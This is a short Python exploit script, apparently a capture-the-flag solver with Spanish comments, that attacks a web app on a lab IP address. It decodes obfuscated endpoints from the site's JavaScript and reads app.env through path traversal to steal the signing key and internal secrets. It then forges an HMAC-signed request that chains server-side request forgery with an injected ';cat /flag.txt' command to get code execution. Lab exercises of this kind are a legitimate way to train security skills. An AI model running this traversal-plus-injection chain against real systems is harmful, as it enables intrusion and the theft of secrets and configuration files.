import sys, re, json, base64, hmac, hashlib
import requests

PORT = int(sys.argv[1])
B = "http://172.170.10.11:%d" % PORT

# 1) deobfuscar el JS (base64) -> endpoints
js = requests.get(B + "/static/app.js", timeout=8).text
dec = {base64.b64decode(s).decode() for s in re.findall(r'_d\("([^"]+)"\)', js)}
print("1) endpoints:", sorted(dec))
files = [x for x in dec if x.startswith("/api/v2/files")][0]
cfg = [x for x in dec if x.endswith("app.env")][0]

# 2) LFI -> config con secretos de la instancia
env = requests.get(B + files, params={"name": "../../app/config/app.env"}, timeout=8).text
print("2) config:\n" + env.strip())
key = re.search(r"SIGNING_KEY=(\S+)", env).group(1)
url = re.search(r"INTERNAL_URL=(\S+)", env).group(1)
nonce = re.search(r"INTERNAL_NONCE=(\S+)", env).group(1)

# 3) firmar HMAC y SSRF al servicio interno (inyeccion)
payload = {"url": url + "?src=x;cat /flag.txt&nonce=" + nonce}
raw = json.dumps(payload).encode()
sig = hmac.new(key.encode(), raw, hashlib.sha256).hexdigest()
r = requests.post(B + "/admin/reindex", data=raw, timeout=10,
                  headers={"X-Sign": sig, "Content-Type": "application/json"})
print("3) RCE ->", r.text.strip()[:200])
m = re.search(r"RP\{[^}]*\}", r.text)
print("FLAG:", m.group(0) if m else "(no encontrada)")
